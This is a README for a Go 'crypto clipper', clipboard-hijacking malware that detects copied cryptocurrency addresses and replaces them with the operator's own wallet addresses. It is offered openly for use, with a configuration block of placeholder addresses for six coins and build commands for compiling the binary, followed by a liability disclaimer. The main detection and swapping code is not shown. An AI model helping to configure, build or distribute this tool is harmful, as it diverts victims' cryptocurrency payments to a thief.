# Golang-Crypto-Clipper

An extremely simple crypto clipper made in Golang.

This program functions by detecting a cryptocurrency address that has been copied to the clipboard and replacing it with a specified address within the program. This is an extremely simple example of how the program operates, with minimal functionality.

# Setup
To use this program, replace the placeholder addresses with your own in the following code block:
```go
var addresses = map[string]string{
	"btc":  "BTCREPLACE",
	"eth":  "ETHREPLACE",
	"xmr":  "XMRREPLACE",
	"ltc":  "LTCREPLACE",
	"doge": "DOGEREPLACE",
	"bch":  "BCHREPLACE",
}
```

Run `go get github.com/atotto/clipboard` to download the required modules.

Then, after you have installed the requirements and ensured that it runs (by executing `go run clipper.go`),

you can compile the program by running `go build -o nameyouwant clipper.go`.

# WARNING
I, Ayden Fleming, am not responsible for any misuse or damage derived from the use of this open-source software. Users are advised to review the code and use it responsibly, ethically, and within the bounds of the law. By downloading, cloning, or using this software, you agree that you are solely responsible for any consequences that may arise from its use. Always obtain proper authorization before accessing systems or data that do not belong to you.
